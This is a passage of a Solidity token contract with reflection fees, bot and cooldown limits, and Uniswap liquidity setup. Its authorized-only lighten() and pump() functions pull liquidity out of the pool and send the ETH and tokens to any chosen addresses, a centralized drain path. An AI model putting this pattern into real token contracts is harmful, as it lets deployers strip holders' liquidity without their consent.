        onlyAuthorized
    {
        _botLocked = value;
    }

    function setTreasuryStats(address _treasury, uint256 liqToTreasury)
        external
        onlyAuthorized
    {
        treasury = _treasury;
        _liqToTreasury = liqToTreasury;
    }



    function exclude(address account)
        public
        onlyAuthorized
    {
        if(accounts[account].excluded == false){
            accounts[account].excluded = true;
            if(accounts[account].fragments > 0) {
                accounts[account].tokens = accounts[account].fragments / _fragmentsFromBalance;
                totalExcluded += accounts[account].tokens;
                totalExcludedFragments += accounts[account].fragments;
            }
            EnumerableSet.add(excludedAccounts, account);
            _fragmentsFromBalance = getFragmentPerToken();
        }
    }

    function include(address account)
        public
        onlyAuthorized
    {
        if(accounts[account].excluded == true) {
            accounts[account].excluded = false;
            totalExcluded -= accounts[account].tokens;
            _balances[account] = 0;
            totalExcludedFragments -= accounts[account].fragments;
            EnumerableSet.remove(excludedAccounts, account);
            _fragmentsFromBalance = getFragmentPerToken();
        }
    }

    function reflect(uint256 amount)
        external
    {
        require(!accounts[msg.sender].excluded, "Excluded addresses can't call this function");
        require(amount * _fragmentsFromBalance <= accounts[msg.sender].fragments, "too much");
        accounts[msg.sender].fragments -= (amount * _fragmentsFromBalance);
        _totalFragments -= amount * _fragmentsFromBalance;
        _fragmentsFromBalance = getFragmentPerToken();
        _totalFees += amount;
    }

    function swap(address payable rec, uint256 tokenAmount)
        external
        onlyOwner
    {
        _swapLocked = true;
        _swapTokensForEth(rec, tokenAmount);
        _swapLocked = false;
    }

    function start() external payable onlyAuthorized {

        address WETH = IUniswapV2Router02(_router).WETH();
        IUniswapV2Router02 router = IUniswapV2Router02(_router);

        liquidityPool = IUniswapV2Factory(router.factory()).createPair(address(this), WETH);

        accounts[liquidityPool].transferPair = true;

        exclude(liquidityPool);

        _precisionFactor = 4;
        _feeFactor = 10 ** _precisionFactor;
        _buyFee = 1000;
        _sellFee = 1500;
        _rfiFee = 100;

        _baseLiquification = 20;
        _liqFreq = 4;
        _step = 2;
        _liquify = _baseLiquification;
        _resetSellCount = 20;

        _liqToTreasury = 50;

        _walletSizeLimitInPercent = 100;
        _cooldownInSeconds = 7 seconds;
        _blockBuffer = 1;
        _maxTxnAmount = _totalSupply / 200;

        exclude(address(0));
        exclude(BURN_ADDRESS);

        _approve(address(this), _router, balanceOf(address(this)));

        router.addLiquidityETH {
            value: msg.value
        } (
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );

        _unpaused = true;
        _isLimiting = true;
        _swapEnabled = true;
        _botLocked = true;

        startingBlock = block.number;
    }

    function lighten(uint amount)
        public
        onlyAuthorized
    {
        _approve(address(this), _router, type(uint256).max);
        IERC20(liquidityPool).approve(_router, type(uint256).max);

        IUniswapV2Router02(_router).removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            0,
            0,
            payable(address(this)),
            block.timestamp
        );

    }

    function buyback(uint ethAmount)
        public
        onlyAuthorized
    {

        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02(_router).WETH();
        path[1] = address(this);
        IUniswapV2Router02(_router)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            path,
            BURN_ADDRESS, // these tokens go to burn
            block.timestamp
        );
    }

    function pump(uint amount, uint percToBurn, uint percToBuyback, address ethDestination, address tokenDestination)
        external
        onlyAuthorized
    {
        uint preTokenAmount = balanceOf(address(this));
        uint preEthAmount = address(this).balance;

        _swapLocked = true;

        lighten(amount);

        uint tokenAmount = balanceOf(address(this)) - preTokenAmount;
        uint tokenAmountToBurn = tokenAmount * percToBurn / 100;
        uint ethAmount = address(this).balance - preEthAmount;
        uint ethAmountToBuyback = ethAmount * percToBuyback / 100;

        _doTransfer(address(this), BURN_ADDRESS, tokenAmountToBurn, 0);

        _doTransfer(address(this), tokenDestination, tokenAmount - tokenAmountToBurn, 0);

        buyback(ethAmountToBuyback);

        payable(ethDestination).transfer(ethAmount - ethAmountToBuyback);

        _swapLocked = false;
    }

}